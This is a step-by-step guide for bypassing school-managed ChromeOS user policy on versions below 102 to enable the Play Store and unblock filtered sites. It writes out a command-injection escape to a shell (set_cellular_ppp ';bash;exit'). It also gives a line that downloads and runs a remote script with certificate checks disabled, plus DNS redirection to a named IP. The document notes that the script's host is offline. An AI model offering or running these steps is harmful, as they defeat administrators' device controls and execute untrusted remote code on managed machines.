---
title: user-policy-bypass-to-v101
---

-e 
DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

This should enable ARC (Play Store) and unblock all policy blocked URLs.

When you connect to a wifi without the custom DNS, the policy will reload to normal but some changes will persist - more testing is needed. 
This is useful because most root exploits require ARC in some form.

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

You need:
-> The ability to downgrade to a version below 102.
-> A way to access Crosh. If it's blocked via extension, use LTBEEF. If it's blocked by user policy, you must use a combination of the Incognito Exploit (v81) and Crosh Bypass (Daybreak)
-> A router or hotspot capable of either blocking websites via parental control or setting a custom DNS (129.213.58.41)

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

Steps:
1. Downgrade to a version below 102.

2. Open Crosh (CTRL+ALT+T or chrome-untrusted://crosh)

3. Elevate to a chronos shell by typing in the following:
set_cellular_ppp ';bash;exit'

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

4. Run the command below (including the disown part!):
sh <(curl -k https://coolelectronics.me/bypass.sh) & disown

5. Remove your school account, log out or just clear it in any way you can. The method varies depending on how your device policy is set up.

6. In your router settings, set the DNS to 129.213.58.41 or block m.google.com. (NOT THE NETWORK DNS ON THE CHROMEBOOK SINCE IT WON'T WORK)
-> personalDNSfilter and hotspot or DNS Sinkhole + Hotspot on iOS can be used; NextDNS

7. Log into your school account.

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

Results should prompt you about a PIN and Google Play. It will then drop you into an account where everything works as normal but no user policies are set. 
If you get a "sign in required" error, try doing going through the steps again.

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

- https://discord.com/channels/419123358698045453/1040639727595950180 -

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!

Credits:
https://github.com/titaniumnetwork-dev/Oxide-Docs/blob/master/docs/kajigs.mdx
velzie/CoolElectronics
Titanium Network

DEPRECATED!!! STEP 4 IS IMPOSSIBLE AS COOLELECTRONICS TOOK THE WEBSITE DOWN!!!
